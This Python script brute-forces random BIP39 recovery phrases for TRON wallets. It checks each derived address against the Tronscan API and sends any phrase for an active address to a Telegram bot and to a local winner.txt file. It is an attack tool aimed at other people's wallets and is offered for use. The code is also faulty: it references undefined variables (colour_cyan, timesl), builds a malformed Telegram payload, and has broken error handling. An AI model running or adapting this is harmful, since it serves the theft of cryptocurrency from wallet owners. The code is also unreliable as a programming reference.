#Tron Wallet Generator Check API for balance
import sys
import pprint
import mnemonic
import time
import datetime
import bip32utils
import requests
import random
import os
from colored import fg, bg, attr
from decimal import Decimal
from multiprocessing.pool import ThreadPool as Pool
from multiprocessing import Pool, freeze_support
import threading
from time import sleep
import ctypes
from os import startfile
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
from mnemonic import Mnemonic



token = '' 
method = ''
user_id = ''



    



def sendBotMsg(msg):
     bloc = requests.post(
        url=f'https://api.telegram.org/bot{token}/{method}',
        data={'chat_id': {user_id}, 'text': {msg}}
    )
    

    
def seek():
    count=0
    while True:
        count+=1
        mnemonic = Mnemonic("english")
        words = mnemonic.generate(strength=128)
        seed_bytes = mnemonic.to_seed(words, passphrase="")
        bip_obj_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.TRON)
        bip_obj_acc = bip_obj_mst.Purpose().Coin().Account(0)
        bip_obj_chain = bip_obj_acc.Change(Bip44Changes.CHAIN_EXT)
        bip_obj_addr = bip_obj_chain.AddressIndex(i)
        addr=(bip_obj_addr.PublicKey().ToAddress())
        try:
            bloc = requests.get("https://apilist.tronscan.org/api/account?address=" + addr) #TRON address API
        except:
            print('{}Черт, бан по IP{}'.format(fg("#008700"), attr("reset")))
            time.sleep(5)
            return (seek)
            pass

        res = bloc.json()
        balances = dict(res)["balance"] # balance balances tokenBalances transactions transactions_out totalFrozen
        transaction = dict(res)["totalTransactionCount"]
        frozen = dict(res)["totalFrozen"]
        print ('TRON Address Mnemo Scan : ' + ' : ' + addr) #TRON address display
        ctypes.windll.kernel32.SetConsoleTitleW(f"TRON Address Mnemo Scan |  Total: {str (count * threading.active_count())}")  
        print('words' + ' : ' + words)
        print (' BALANCE = ' +  str(balances)+ '  TotalFrozen  = ' +  str(frozen) + '  Transactions = ' +  str(transaction))        
        print (                                                                            ) 
        if int(balances) > 0 or int(transaction) > 0 or int(frozen) > 0:
            print (' <================================= WINNER TRON TRX WINNER =================================>' + '\n')
            print("Matching Key ==== TRON address Found!!!\n words: ") #TRON address winner
            print (colour_cyan + 'TRON Address Mnemo Scan : ' + str (count) + ' : ' + addr)
            print (' Balance = ' +  str(balances)+ '  TotalFrozen  = ' +  str(frozen) + '  Transactions = ' +  str(transaction)) 
            print (' <================================= WINNER TRON TRX WINNER =================================>' + '\n')
            msg ='Address: {} | Mnemonic phrase:                    {}'.format(addr, words)
            sendBotMsg(msg)  
            f=open(u"winner.txt","a")
            f.write('\n==========TRON TRX Address with Balances/Total Received Ammount==============')
            f.write('\nWORDS  : ' + words)
            f.write('\nTRON Address     : ' + addr)
            f.write('\nTRON Balance     : ' + balances)
            f.write('\n==========TRON TRX Address with Balances/Total Received Ammount==============') 
            f.close()
            time.sleep(timesl)
            continue


    
    
threads = []

for i in range(20):
    t = threading.Thread(target=seek)
    threads.append(t)
    t.start()
